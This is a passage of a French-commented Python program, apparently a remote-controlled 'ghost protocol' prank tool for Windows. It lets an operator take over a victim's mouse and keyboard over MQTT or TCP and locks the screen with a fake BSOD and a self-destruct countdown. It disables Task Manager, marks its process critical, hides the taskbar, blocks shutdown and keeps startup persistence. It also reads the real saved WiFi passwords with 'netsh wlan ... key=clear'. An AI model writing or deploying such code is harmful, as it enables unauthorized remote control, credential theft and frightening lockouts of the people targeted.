            if (w_left - padding < mx < w_right + padding) and (w_top - padding < my < w_bottom + padding):
                vx = float(cx - mx)
                vy = float(cy - my)
                dist = math.hypot(vx, vy) or 1.0

                near_left = (w_left <= min_x + 70)
                near_right = (w_left >= max_x - 70)
                near_top = (w_top <= min_y + 70)
                near_bottom = (w_top >= max_y - 70)
                is_corner = (near_left or near_right) and (near_top or near_bottom)
                is_wall = (near_left or near_right or near_top or near_bottom)

                if is_corner:
                    # Piégée dans un coin : sprint franc vers le centre libre de l'écran
                    to_center_x = (sw / 2.0) - cx
                    to_center_y = (sh / 2.0) - cy
                    c_dist = math.hypot(to_center_x, to_center_y) or 1.0
                    vx = to_center_x / c_dist
                    vy = to_center_y / c_dist
                elif is_wall:
                    # Contre un mur : courir vivement le long du bord libre avec décollement vers l'intérieur
                    if near_left and vx < 0:
                        vx = 0.35
                        vy = (1.0 if my <= cy else -1.0)
                    elif near_right and vx > 0:
                        vx = -0.35
                        vy = (1.0 if my <= cy else -1.0)
                    elif near_top and vy < 0:
                        vx = (1.0 if mx <= cx else -1.0)
                        vy = 0.35
                    elif near_bottom and vy > 0:
                        vx = (1.0 if mx <= cx else -1.0)
                        vy = -0.35
                    else:
                        vx = vx / dist
                        vy = vy / dist
                else:
                    vx = vx / dist
                    vy = vy / dist

                norm = math.hypot(vx, vy) or 1.0
                dir_x = vx / norm
                dir_y = vy / norm

                # Foulées de sprint rapides coordonnées avec l'animation des jambes
                total_steps = 10
                step_dist = 18.0
                step_x = dir_x * step_dist
                step_y = dir_y * step_dist

                legs_state["is_moving"] = True
                legs_state["dir_x"] = dir_x
                legs_state["dir_y"] = dir_y
                legs_state["speed"] = 18.0

                cur_l = float(w_left)
                cur_t = float(w_top)

                for _ in range(total_steps):
                    if not elusive_window_active:
                        break
                    cur_l = max(float(min_x), min(float(max_x), cur_l + step_x))
                    cur_t = max(float(min_y), min(float(max_y), cur_t + step_y))

                    ctypes.windll.user32.SetWindowPos(
                        current_hwnd, 0,
                        int(cur_l), int(cur_t),
                        0, 0,
                        0x0001 | 0x0004  # SWP_NOSIZE | SWP_NOZORDER
                    )

                    legs_state["target_cx"] = int(cur_l + (w_width // 2))
                    legs_state["target_bottom"] = int(cur_t + w_height)
                    time.sleep(0.018)

                legs_state["is_moving"] = False
                legs_state["speed"] = 0.0
            else:
                # La souris n'est pas dangereusement proche : posture d'attente sur ses jambes
                legs_state["is_moving"] = False
                legs_state["speed"] = 0.0
                legs_state["target_cx"] = cx
                legs_state["target_bottom"] = bottom
                time.sleep(0.025)

        except Exception:
            pass

    legs_state["active"] = False

def toggle_elusive_window(active, window_title=""):
    global elusive_window_active, elusive_window_title, legs_state
    if active:
        elusive_window_title = window_title or ""
        ensure_legs_overlay_started()
        if not elusive_window_active:
            elusive_window_active = True
            threading.Thread(target=_elusive_window_loop, daemon=True).start()
    else:
        elusive_window_active = False
        elusive_window_title = ""
        legs_state["active"] = False

class CartoonMonkeyOverlay:
    """
    Singe farceur en Pixel Art authentique (généré via Retro Diffusion) :
    Un petit singe espiègle animé en 16 frames qui attrape une barre de volume
    en pixel art, la tire progressivement vers le bas en réduisant le volume sonore
    Windows via VK_VOLUME_DOWN, puis éclate de rire victorieusement.
    """
    def __init__(self, master, scale=4):
        self.master = master
        self.scale = scale
        self.frame_size = 64 * scale
        self.transparent_color = "#010101"
        
        self.win = tk.Toplevel(master)
        self.win.overrideredirect(True)
        self.win.attributes("-topmost", True)
        self.win.attributes("-transparentcolor", self.transparent_color)
        self.win.configure(bg=self.transparent_color)
        self.win.withdraw()
        
        self.canvas = tk.Canvas(
            self.win,
            width=self.frame_size,
            height=self.frame_size,
            bg=self.transparent_color,
            highlightthickness=0
        )
        self.canvas.pack(fill="both", expand=True)
        
        try:
            self.win.update_idletasks()
            self.hwnd = ctypes.windll.user32.GetParent(self.win.winfo_id()) or self.win.winfo_id()
            ex = ctypes.windll.user32.GetWindowLongW(self.hwnd, -20)
            ctypes.windll.user32.SetWindowLongW(
                self.hwnd, -20,
                ex | 0x00080000 | 0x00000020 | 0x00000080 | 0x08000000
            )
        except Exception:
            self.hwnd = None
            
        self.frames = []
        self._load_frames()
        self.current_frame = 0
        self.img_item = self.canvas.create_image(0, 0, anchor=tk.NW, image=self.frames[0] if self.frames else "")
        self.visible = False
        self._loop_active = True
        self._tick()
        
    def _load_frames(self):
        try:
            import pixel_assets
            self.frames = pixel_assets.get_monkey_photoimages(scale=self.scale, bg_hex=self.transparent_color)
        except Exception as e:
            log_debug(f"CartoonMonkeyOverlay _load_frames error: {e}")
            self.frames = []
            
    def _tick(self):
        if not self._loop_active:
            return
        delay = 100
        try:
            global monkey_state
            if monkey_state.get("active", False):
                if not self.visible:
                    self.visible = True
                    self.win.deiconify()
                    self.win.lift()
                    sw = self.win.winfo_screenwidth()
                    sh = self.win.winfo_screenheight()
                    x = sw - self.frame_size - 80
                    y = sh - self.frame_size - 100
                    self.win.geometry(f"{self.frame_size}x{self.frame_size}+{x}+{y}")
                    self.current_frame = 0
                    
                if self.frames:
                    self.canvas.itemconfig(self.img_item, image=self.frames[self.current_frame])
                    
                # Baisse le volume pendant que le singe tire le slider (frames 3 à 11)
                if 3 <= self.current_frame <= 11:
                    try:
                        ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
                        ctypes.windll.user32.keybd_event(0xAE, 0, 2, 0)
                        ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
                        ctypes.windll.user32.keybd_event(0xAE, 0, 2, 0)
                    except Exception:
                        pass
                        
                if self.current_frame >= 12:
                    delay = 240
                elif self.current_frame < 3:
                    delay = 140
                else:
                    delay = 95
                    
                self.current_frame = (self.current_frame + 1) % len(self.frames) if self.frames else 0
            else:
                if self.visible:
                    self.visible = False
                    self.win.withdraw()
                delay = 200
        except Exception:
            pass
            
        if self.master:
            self.master.after(delay, self._tick)

def toggle_monkey_volume(active):
    global monkey_volume_active, monkey_state
    monkey_volume_active = bool(active)
    monkey_state["active"] = bool(active)
    ensure_prank_overlays_started()
    log_debug(f"toggle_monkey_volume: active={monkey_volume_active}")

def notify_remote_control_state(active):
    """
    Notifie l'opérateur (viewer) du changement d'état du contrôle à distance.
    """
    global active_mqtt_client, active_tcp_socket, client_id
    payload = json.dumps({"remote_control": active}).encode('utf-8')
    
    # 1. Si connecté en Cloud via MQTT
    if active_mqtt_client and client_id:
        try:
            status_topic = f"{MQTT_TOPIC}/{client_id}/status"
            active_mqtt_client.publish(status_topic, payload, qos=1)
        except Exception:
            pass
            
    # 2. Si connecté en TCP local
    if active_tcp_socket:
        try:
            # Type de paquet = 2 pour le statut de contrôle à distance
            with tcp_send_lock:
                active_tcp_socket.sendall((2).to_bytes(4, byteorder='big') + len(payload).to_bytes(4, byteorder='big') + payload)
        except Exception:
            pass

def toggle_remote_control_remotely(active):
    """
    Active ou desactive le mode controle a distance et met a jour les hooks.
    """
    global remote_control_active
    remote_control_active = active
    log_debug(f"toggle_remote_control_remotely: {active}")
    update_hooks_state()
    notify_remote_control_state(active)

def handle_remote_input(cmd_data):
    """
    Simule les inputs souris et clavier recus de l'operateur.
    """
    global remote_control_active
    if not remote_control_active:
        return
        
    t = cmd_data.get("type")
    
    # 1. Mouvement de souris
    if t == "mouse_move":
        try:
            rx = float(cmd_data.get("x", 0.0))
            ry = float(cmd_data.get("y", 0.0))
            
            # Recuperer la taille de l'ecran principal
            sw = ctypes.windll.user32.GetSystemMetrics(0)
            sh = ctypes.windll.user32.GetSystemMetrics(1)
            
            x = int(rx * sw)
            y = int(ry * sh)
            
            ctypes.windll.user32.SetCursorPos(x, y)
        except Exception as me:
            log_debug(f"Error handling remote mouse_move: {me}")
            
    # 2. Clic de souris
    elif t == "mouse_click":
        try:
            button = cmd_data.get("button", "left")
            state = cmd_data.get("state", "down")
            
            # Definir l'event flags
            # Left: down = 0x0002, up = 0x0004
            # Right: down = 0x0008, up = 0x0010
            # Middle: down = 0x0020, up = 0x0040
            if button == "left":
                flags = 0x0002 if state == "down" else 0x0004
            elif button == "right":
                flags = 0x0008 if state == "down" else 0x0010
            elif button == "middle":
                flags = 0x0020 if state == "down" else 0x0040
            else:
                return
                
            ctypes.windll.user32.mouse_event(flags, 0, 0, 0, 0)
        except Exception as ce:
            log_debug(f"Error handling remote mouse_click: {ce}")
            
    # 3. Touche de clavier
    elif t == "key":
        try:
            vk = int(cmd_data.get("vk", 0))
            state = cmd_data.get("state", "down")
            
            # keybd_event(vk, scan, flags, extra)
            # flags: KEYEVENTF_KEYUP = 0x0002 pour relacher, 0 pour enfoncer
            flags = 0x0002 if state == "up" else 0
            
            ctypes.windll.user32.keybd_event(vk, 0, flags, 0)
        except Exception as ke:
            log_debug(f"Error handling remote key: {ke}")




def show_bsod():
    global bsod_window, root
    if bsod_window:
        return
        
    def run_show():
        global bsod_window, root
        if bsod_window:
            return
        try:
            # Masquer temporairement l'overlay central
            hide_overlay_panel()
            
            bsod_window = tk.Toplevel(root)
            bsod_window.title("BSOD")
            bsod_window.attributes("-fullscreen", True)
            bsod_window.attributes("-topmost", True)
            bsod_window.configure(bg="#0078d7")
            bsod_window.protocol("WM_DELETE_WINDOW", lambda: None)
            
            content_frame = tk.Frame(bsod_window, bg="#0078d7")
            content_frame.place(relx=0.1, rely=0.15, anchor="nw")
            
            sad_face = tk.Label(content_frame, text=":(", font=("Segoe UI", 110), bg="#0078d7", fg="white")
            sad_face.pack(anchor="w")
            
            message = (
                "Votre ordinateur a rencontré un problème et doit redémarrer. Nous collectons simplement\n"
                "quelques informations sur les erreurs, puis nous allons redémarrer pour vous.\n\n"
                "0% achevé"
            )
            lbl_msg = tk.Label(content_frame, text=message, font=("Segoe UI", 16), bg="#0078d7", fg="white", justify="left")
            lbl_msg.pack(anchor="w", pady=(20, 40))
            
            def update_pct():
                for p in range(0, 101, 10):
                    if not bsod_window or not bsod_window.winfo_exists():
                        break
                    try:
                        if root:
                            root.after(0, lambda val=p: lbl_msg.config(text=(
                                "Votre ordinateur a rencontré un problème et doit redémarrer. Nous collectons simplement\n"
                                "quelques informations sur les erreurs, puis nous allons redémarrer pour vous.\n\n"
                                f"{val}% achevé"
                            )) if bsod_window and bsod_window.winfo_exists() else None)
                    except Exception:
                        pass
                    time.sleep(2.0)
            
            threading.Thread(target=update_pct, daemon=True).start()
            
            qr_frame = tk.Frame(content_frame, bg="#0078d7")
            qr_frame.pack(anchor="w", pady=20)
            
            qr_canvas = tk.Canvas(qr_frame, width=100, height=100, bg="white", highlightthickness=0)
            qr_canvas.pack(side="left")
            
            for row in range(10):
                for col in range(10):
                    if (row in (0, 1, 2, 7, 8, 9) and col in (0, 1, 2, 7, 8, 9)) or random.random() < 0.4:
                        if not (row in (0, 1, 2) and col in (7, 8, 9)) and not (row in (7, 8, 9) and col in (0, 1, 2)):
                            qr_canvas.create_rectangle(col*10, row*10, col*10+10, row*10+10, fill="black", outline="black")
                            
            info_text = (
                "Pour plus d'informations sur ce problème et les solutions possibles, visitez le site\n"
                "https://www.windows.com/stopcode\n\n"
                "Si vous appelez un technicien, donnez-lui ces informations :\n"
                "Code d'arrêt : DEEPMIND_GHOST_PROTOCOL_CRITICAL_FAILURE"
            )
            lbl_info = tk.Label(qr_frame, text=info_text, font=("Segoe UI", 11), bg="#0078d7", fg="white", justify="left")
            lbl_info.pack(side="left", padx=20)
            
            # Enregistrer le HWND et mettre à jour les hooks
            bsod_window.update()
            bhwnd = int(bsod_window.wm_frame(), 16)
            active_troll_hwnds.add(bhwnd)
            
            update_hooks_state()
            
        except Exception:
            pass

    if root:
        try:
            root.after(0, run_show)
        except Exception:
            run_show()
    else:
        run_show()

def hide_bsod():
    global bsod_window
    if not bsod_window:
        return
        
    def run_hide():
        global bsod_window
        if bsod_window:
            try:
                bhwnd = int(bsod_window.wm_frame(), 16)
                active_troll_hwnds.discard(bhwnd)
            except Exception:
                pass
            try:
                bsod_window.destroy()
            except Exception:
                pass
            bsod_window = None
            update_hooks_state()
        show_overlay_panel()

    if root:
        try:
            root.after(0, run_hide)
        except Exception:
            run_hide()
    else:
        run_hide()

def stop_and_clean():
    """
    Arrête proprement le verrouillage de la souris et ferme l'écran de fond.
    Mais garde le flux d'enregistrement actif.
    """
    # Rétablir les privilèges du processus et réactiver le Gestionnaire des tâches
    set_process_critical(False)
    set_task_manager_disabled(False)
    
    global mouse_locked, root, matrix_running, tkinter_hwnd
    global spam_window, spam_text_widget, spam_hwnd, spam_window_active
    global protocol_running, cmd_troll_queue, notepad_troll_queue
    global cmd_typing_active, notepad_typing_active
    global cmd_troll_active, notepad_troll_active
    global active_dialog, active_dialog_event, dialog_is_open
    global is_launching
    global prank_keys_active
    global remote_control_active
    
    protocol_running = False
    mouse_locked = False
    matrix_running = False
    is_launching = False
    
    # Désactiver tous les trolls avancés et détruire les overlays cartoon
    destroy_all_cartoon_overlays()
    toggle_mouse_drift(False)
    toggle_drunk_mouse(False)
    toggle_invisible_wall(False)
    toggle_dead_pixels(False)
    toggle_ghost_sounds(False)
    toggle_system_tts(False)
    toggle_screen_rotate(False)
    toggle_elusive_window(False)
    toggle_monkey_volume(False)
    toggle_prank_keys(False)
    hide_bsod()
    toggle_remote_control_remotely(False)
    keys_state["active"] = False
    ghost_state["active"] = False
    tts_state["active"] = False
    rotate_state["active"] = False
    
    # Réinitialiser les indicateurs d'écriture/troll
    cmd_typing_active = False
    notepad_typing_active = False
    cmd_troll_active = False
    notepad_troll_active = False
    spam_window_active = False
    
    # Vider les files d'attente de troll
    cmd_troll_queue.clear()
    notepad_troll_queue.clear()
    
    # Détruire les fenêtres de dialogue actives si présentes
    if active_dialog:
        try:
            active_dialog.destroy()
        except Exception:
            pass
        active_dialog = None
    if active_dialog_event:
        try:
            active_dialog_event.set()
        except Exception:
            pass
        active_dialog_event = None
    dialog_is_open = False

    set_taskbar_visibility(True)  # Réafficher la barre des tâches
    uninstall_hooks()            # Désinstaller immédiatement les hooks
    update_hooks_state()
    if tkinter_hwnd:
        unregister_shutdown_block(tkinter_hwnd)
        
    if spam_window:
        try:
            spam_window.destroy()
        except Exception:
            pass
    spam_window = None
    spam_text_widget = None
    spam_hwnd = None
    
    # Supprimer toutes les fenêtres de message actives
    global active_troll_wins
    for win in list(active_troll_wins):
        try:
            win.destroy()
        except Exception:
            pass
    active_troll_wins.clear()
    active_troll_hwnds.clear()
    
    # Détruire les fenêtres CMD et Notepad simulées de façon thread-safe
    if root:
        try:
            root.after(0, lambda: destroy_simulated_window("cmd"))
            root.after(0, lambda: destroy_simulated_window("notepad"))
        except Exception:
            pass
    else:
        destroy_simulated_window("cmd")
        destroy_simulated_window("notepad")

    # Réinitialiser les textes de l'interface de façon thread-safe
    if root:
        try:
            root.after(0, lambda: screen_text_widget.delete("1.0", "end") if screen_text_widget else None)
            root.after(0, lambda: label_header.config(text=make_box_header(["", "", "", "", "", ""], subtitle="P R O T O C O L  [v3.7.1]"), fg="#00cc00") if label_header else None)
            root.after(0, lambda: label_status.config(text="[SYS] Initialisation du protocole...", fg="#00ff00") if label_status else None)
        except Exception:
            pass

    # Garder la persistance au démarrage Windows mais effacer l'état temporaire du protocole
    clear_state()
    
    if root:
        try:
            root.withdraw()
        except Exception:
            pass

def trigger_stop_protocol_remotely():
    """
    Arrête la simulation et déverrouille l'écran de la victime à la demande de l'opérateur.
    """
    if root:
        try:
            root.after(0, stop_and_clean)
        except Exception:
            pass
    else:
        try:
            stop_and_clean()
        except Exception:
            pass

def trigger_start_protocol_remotely():
    """
    Démarre la simulation et verrouille l'écran de la cible à la demande de l'opérateur.
    """
    log_debug("trigger_start_protocol_remotely called")
    if root:
        try:
            root.after(0, start_lockdown_protocol)
        except Exception as e:
            log_debug(f"Exception during root.after in trigger_start_protocol_remotely: {e}")
    else:
        log_debug("Warning: trigger_start_protocol_remotely called but root is None")

def start_lockdown_protocol():
    """
    Active le verrouillage complet et lance le scénario.
    """
    global protocol_running, mouse_locked, matrix_running
    global mouse_fight_count, notepad_close_count, cmd_close_count
    global alt_tab_attempt_count, escape_attempt_count, alt_f4_attempt_count
    global win_key_attempt_count, task_manager_attempt_count, focus_loss_attempt_count
    global scenario_thread
    
    log_debug("start_lockdown_protocol started")
    if protocol_running:
        log_debug("start_lockdown_protocol aborted: protocol already running")
        return
        
    # S'assurer que l'ancien thread de scénario s'arrête proprement s'il est encore actif
    if scenario_thread and scenario_thread.is_alive():
        log_debug("Attente de la fin de l'ancien thread de scénario...")
        scenario_thread.join(timeout=2.0)
        
    protocol_running = True
    
    # Activer la sécurité contre le Gestionnaire des tâches et les outils de surveillance
    set_task_manager_disabled(True)
    set_process_critical(True)
    
    # Réinitialiser les statistiques de panique pour la nouvelle session
    mouse_fight_count = 0
    notepad_close_count = 0
    cmd_close_count = 0
    alt_tab_attempt_count = 0
    escape_attempt_count = 0
    alt_f4_attempt_count = 0
    win_key_attempt_count = 0
    task_manager_attempt_count = 0
    focus_loss_attempt_count = 0
    
    # Masquer la barre des tâches
    set_taskbar_visibility(False)
    
    # Rendre root visible, plein écran et au premier plan
    if root:
        try:
            root.deiconify()
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            root.lift()
            log_debug("root deiconified and configured to fullscreen")
        except Exception as e:
            log_debug(f"Exception during root setup in start_lockdown_protocol: {e}")
            
    # Enregistrer le handle et forcer le focus
    record_tkinter_hwnd()
    
    # Démarrer la pluie Matrix
    start_matrix_rain()
    log_debug("Matrix rain started")
    
    # Démarrer la surveillance du focus et le watchdog
    mouse_locked = True
    
    # Installer les hooks (après avoir activé mouse_locked)
    update_hooks_state()
    threading.Thread(target=focus_monitor_loop, daemon=True).start()
    threading.Thread(target=watchdog_loop, daemon=True).start()
    log_debug("Hooks and monitor threads started")
    
    # Lancer le scénario de simulation dans un thread
    scenario_thread = threading.Thread(target=run_ghost_scenario, daemon=True)
    scenario_thread.start()
    log_debug("run_ghost_scenario thread launched")


# ==============================================================================
# 7. INTERFACE D'ARRIÈRE-PLAN GHOST (100% SÉCURISÉE)
# ==============================================================================

def on_focus_out(event=None):
    """
    En cas de perte de focus de l'écran noir (par exemple Win+D ou clic parasite),
    on le force à se remettre en plein écran, topmost, visible, et on remet le focus.
    """
    global root, mouse_locked, current_allowed_hwnd, tkinter_hwnd, is_launching, dialog_is_open, protocol_running
    if not protocol_running:
        return
    if dialog_is_open:
        return
    if mouse_locked and root:
        try:
            # Si on est en train de lancer une fenêtre, on ne fait rien pour ne pas la masquer.
            if is_launching:
                return
                
            fg_hwnd = ctypes.windll.user32.GetForegroundWindow()
            if current_allowed_hwnd and fg_hwnd == current_allowed_hwnd:
                # La fenêtre autorisée a déjà le focus, pas besoin d'intervenir.
                return
                
            # Si Notepad ou CMD est la fenêtre autorisée, on ne veut pas remettre le fond noir topmost/lifté.
            if current_allowed_hwnd and current_allowed_hwnd != tkinter_hwnd:
                # Si le focus a glissé sur autre chose que la fenêtre autorisée, on force le focus
                # sur celle-ci sans lifter l'écran noir.
                if fg_hwnd != current_allowed_hwnd:
                    if current_allowed_hwnd in (cmd_hwnd, notepad_hwnd):
                        force_foreground(current_allowed_hwnd)
                return
                
            # Sinon, on remet l'écran noir au premier plan.
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            root.deiconify()
            root.lift()
            
            if tkinter_hwnd:
                force_foreground(tkinter_hwnd)
        except Exception:
            pass

def record_tkinter_hwnd():
    """
    Enregistre le handle de la fenêtre de fond noir comme fenêtre autorisée au démarrage.
    """
    global current_allowed_hwnd, tkinter_hwnd
    try:
        root.update()
        tkinter_hwnd = int(root.wm_frame(), 16)
    except Exception:
        tkinter_hwnd = ctypes.windll.user32.GetForegroundWindow()
        
    current_allowed_hwnd = tkinter_hwnd
    if tkinter_hwnd:
        make_window_topmost(tkinter_hwnd)
        force_foreground(tkinter_hwnd)
        register_shutdown_block(
            tkinter_hwnd,
            "Sequence de protocole systeme GHOST PROTOCOL en cours d'execution. "
            "Veuillez ne pas fermer la session pour eviter toute corruption."
        )


# ==============================================================================
# 8. PLUIE MATRIX — ANIMATION CANVAS
# ==============================================================================

MATRIX_CHARS = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF#$%&"

def start_matrix_rain():
    """
    Démarre l'animation de pluie Matrix sur le canvas principal.
    Chaque goutte est un texte multi-ligne qui tombe du haut vers le bas.
    """
    global matrix_canvas, matrix_drops, matrix_running
    matrix_running = True
    
    # Nettoyer le canvas pour éviter les caractères gelés des sessions précédentes
    if matrix_canvas:
        try:
            matrix_canvas.delete("all")
        except Exception:
            pass
    
    try:
        sw = root.winfo_screenwidth()
        sh = root.winfo_screenheight()
    except Exception:
        sw, sh = 1920, 1080
    
    col_width = 20
    num_cols = sw // col_width
    
    matrix_drops = []
    for i in range(num_cols):
        if random.random() < 0.55:
            trail_len = random.randint(6, 24)
            text_str = "\n".join(random.choice(MATRIX_CHARS) for _ in range(trail_len))
            x = i * col_width + col_width // 2
            y = random.randint(-sh * 2, -50)
            speed = random.uniform(2, 10)
            
            green_val = random.randint(80, 255)
            color = f"#00{green_val:02x}00"
            
            tid = matrix_canvas.create_text(
                x, y, text=text_str, fill=color,
                font=("Consolas", 10), anchor="n"
            )
            matrix_drops.append({
                'id': tid, 'x': x, 'y': y,
                'speed': speed, 'trail_len': trail_len
            })
    
    _animate_matrix_rain()

def _animate_matrix_rain():
    """Boucle d'animation non-bloquante pour la pluie Matrix."""
    if not matrix_running or not matrix_canvas:
        return
    try:
        sh = root.winfo_screenheight()
        
        for drop in matrix_drops:
            matrix_canvas.move(drop['id'], 0, drop['speed'])
            drop['y'] += drop['speed']
            
            # Réinitialiser en haut quand la goutte dépasse l'écran
            if drop['y'] > sh + 500:
                drop['y'] = random.randint(-600, -100)
                matrix_canvas.coords(drop['id'], drop['x'], drop['y'])
                drop['speed'] = random.uniform(2, 10)
                
                # Régénérer les caractères
                new_text = "\n".join(random.choice(MATRIX_CHARS) for _ in range(drop['trail_len']))
                matrix_canvas.itemconfigure(drop['id'], text=new_text)
                g = random.randint(80, 255)
                matrix_canvas.itemconfigure(drop['id'], fill=f"#00{g:02x}00")
            
            # Changer aléatoirement les caractères pour l'effet scintillement
            elif random.random() < 0.015:
                new_text = "\n".join(random.choice(MATRIX_CHARS) for _ in range(drop['trail_len']))
                matrix_canvas.itemconfigure(drop['id'], text=new_text)
        
        matrix_canvas.after(50, _animate_matrix_rain)
    except Exception:
        pass


# ==============================================================================
# 9. EFFETS VISUELS SUR L'ÉCRAN OVERLAY
# ==============================================================================

def write_to_screen(text):
    """Écrit du texte dans le widget terminal de l'overlay (thread-safe)."""
    if root and screen_text_widget:
        root.after(0, lambda t=text: _write_to_screen_gui(t))

def _write_to_screen_gui(text):
    try:
        screen_text_widget.insert("end", text)
        screen_text_widget.see("end")
    except Exception:
        pass

def clear_overlay_screen():
    """Efface le contenu du widget terminal de l'overlay (thread-safe)."""
    if root and screen_text_widget:
        root.after(0, _clear_overlay_screen_gui)

def _clear_overlay_screen_gui():
    try:
        screen_text_widget.delete("1.0", "end")
    except Exception:
        pass

def type_on_screen(text, delay=0.03):
    """Tape du texte caractère par caractère sur l'overlay (appelé depuis le thread scénario)."""
    for char in text:
        if not mouse_locked:
            return
        write_to_screen(char)
        play_typing_sound(char)
        time.sleep(delay)

def hide_overlay_panel():
    """Masque le panneau overlay central (pour montrer les fenêtres CMD/Notepad)."""
    if overlay_glow and root:
        root.after(0, lambda: overlay_glow.place_forget())

def show_overlay_panel():
    """Affiche le panneau overlay central."""
    if overlay_glow and root:
        root.after(0, lambda: overlay_glow.place(relx=0.5, rely=0.5, anchor="center", width=840, height=580))

def animate_progress(label_widget, prefix, duration_sec):
    """Anime une barre de progression ASCII sur un label pendant duration_sec secondes."""
    total_steps = 40
    step_time = duration_sec / total_steps
    for i in range(total_steps + 1):
        if not mouse_locked:
            return
        pct = int(100 * i / total_steps)
        filled = int(i * 30 / total_steps)
        empty = 30 - filled
        bar = f"[{'█' * filled}{'░' * empty}] {pct}%"
        root.after(0, lambda t=f"{prefix}\n{bar}": label_widget.config(text=t))
        time.sleep(step_time)

def animate_countdown(seconds):
    """Affiche un grand countdown pulsant rouge sur l'overlay."""
    clear_overlay_screen()
    time.sleep(0.2)
    
    for s in range(seconds, 0, -1):
        if not mouse_locked:
            return
        mins, secs = divmod(s, 60)
        time_str = f"{mins:02d}:{secs:02d}"
        color = "#ff0000" if s % 2 == 0 else "#880000"
        
        def _update(ts=time_str, c=color):
            try:
                screen_text_widget.delete("1.0", "end")
                screen_text_widget.tag_configure("countdown_big", font=("Consolas", 52, "bold"), foreground=c, justify="center")
                screen_text_widget.tag_configure("countdown_warn", font=("Consolas", 14, "bold"), foreground="#ff3333", justify="center")
                screen_text_widget.tag_configure("countdown_sub", font=("Consolas", 11), foreground="#aa2222", justify="center")
                screen_text_widget.insert("end", "\n\n", "countdown_warn")
                screen_text_widget.insert("end", "AUTODESTRUCTION DU SYSTEME\n\n", "countdown_warn")
                screen_text_widget.insert("end", ts, "countdown_big")
                screen_text_widget.insert("end", "\n\n\n", "countdown_sub")
                screen_text_widget.insert("end", "Destruction immediate de la table de partition...\n", "countdown_sub")
                screen_text_widget.insert("end", "Ne redemarre surtout pas ton PC, la corruption adore ca.", "countdown_sub")
            except Exception:
                pass
        root.after(0, _update)
        
        # Bips sonores pour les 10 dernières secondes
        if HAS_WINSOUND and s <= 10:
            freq = 600 + (10 - s) * 80
            threading.Thread(target=lambda f=freq: winsound.Beep(f, 150), daemon=True).start()
        
        time.sleep(1.0)

def beep_short(freq=1200, dur=50):
    """Joue un bip court dans un thread séparé."""
    if HAS_WINSOUND:
        threading.Thread(target=lambda: winsound.Beep(freq, dur), daemon=True).start()


# ==============================================================================
# 10. INFORMATIONS SYSTÈME RÉELLES ET GÉNÉRATEURS DE DONNÉES FICTIVES
# ==============================================================================

def get_real_system_info():
    """Récupère les vraies infos système pour rendre la démonstration crédible."""
    info = {}
    try:
        info['hostname'] = socket.gethostname()
    except Exception:
        info['hostname'] = "DESKTOP-" + ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=7))
    
    try:
        info['username'] = os.getlogin()
    except Exception:
        info['username'] = "User"
    
    try:
        info['ip'] = socket.gethostbyname(socket.gethostname())
    except Exception:
        info['ip'] = f"192.168.1.{random.randint(2, 254)}"
    
    info['mac'] = ':'.join([f'{random.randint(0, 255):02x}' for _ in range(6)])
    
    try:
        info['os'] = platform.platform()
    except Exception:
        info['os'] = "Windows-10"
    
    return info

def generate_fake_netstat(local_ip):
    """Génère un faux affichage netstat avec des connexions internationales suspectes."""
    connections = [
        (local_ip, random.randint(49152, 65535), f"185.43.217.{random.randint(1,254)}", 443, "ESTABLISHED", "Moscou, RU"),
        (local_ip, random.randint(49152, 65535), f"223.71.{random.randint(1,254)}.{random.randint(1,254)}", 8080, "ESTABLISHED", "Beijing, CN"),
        (local_ip, random.randint(49152, 65535), f"91.234.33.{random.randint(1,254)}", 1337, "ESTABLISHED", "Kiev, UA"),
        (local_ip, random.randint(49152, 65535), f"45.227.{random.randint(1,254)}.{random.randint(1,254)}", 22, "SYN_SENT", "Sao Paulo, BR"),
        (local_ip, random.randint(49152, 65535), f"156.67.14.{random.randint(1,254)}", 4444, "ESTABLISHED", "Lagos, NG"),
        (local_ip, random.randint(49152, 65535), f"77.88.{random.randint(1,254)}.{random.randint(1,254)}", 993, "ESTABLISHED", "Pyongyang, KP"),
    ]
    
    output = "\n  Active Connections\n\n"
    output += f"  {'Proto':<8}{'Local Address':<25}{'Foreign Address':<25}{'State':<15}{'Origin'}\n"
    output += "  " + "-" * 90 + "\n"
    
    for lip, lport, fip, fport, state, origin in connections:
        output += f"  {'TCP':<8}{lip}:{lport:<14}{fip}:{fport:<18}{state:<15}{origin}\n"
    
    return output

def generate_real_wifi_passwords():
    """Récupère les véritables profils WiFi enregistrés et leurs mots de passe."""
    wifi_list = []
    try:
        # Récupérer les profils WiFi
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], stderr=subprocess.DEVNULL, shell=True).decode('utf-8', errors='ignore')
        profiles = re.findall(r":\s(.*)", meta_data)
        # Nettoyer les profils
        profiles = [p.strip() for p in profiles if p.strip() and not p.strip().startswith("Tous les profils utilisateur")]
        
        # Si aucun profil n'est trouvé, essayer une recherche alternative pour d'autres locales
        if not profiles:
            for line in meta_data.split('\n'):
                if ':' in line:
                    val = line.split(':', 1)[1].strip()
                    if val and not val.startswith("Tous les profils") and not val.startswith("All User Profile"):
                        profiles.append(val)
        
        # Dédupliquer les profils tout en conservant l'ordre
        seen = set()
        profiles = [x for x in profiles if not (x in seen or seen.add(x))]
        
        for profile in profiles[:8]:  # Limiter à 8 profils
            try:
                detail_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear'], stderr=subprocess.DEVNULL, shell=True).decode('utf-8', errors='ignore')
                
                # Type de sécurité
                security = "WPA2"
                sec_match = re.search(r"(?:Authentification|Authentication)\s*:\s*(.*)", detail_data)
                if sec_match:
                    security = sec_match.group(1).strip()
                
                # Mot de passe
                password = ""
                pass_match = re.search(r"(?:Contenu de la cl[^\n:]*|Key Content)\s*:\s*(.*)", detail_data)
                if pass_match:
                    password = pass_match.group(1).strip()
                
                if not password:
                    if "Absente" in detail_data or "None" in detail_data or "absent" in detail_data.lower():
                        password = "[Réseau Ouvert]"
                    else:
                        password = "[Sécurisé / Droits requis]"
                
                wifi_list.append((profile, security, password))
            except Exception:
                wifi_list.append((profile, "WPA2", "[Erreur d'accès]"))
    except Exception:
        pass

    if not wifi_list:
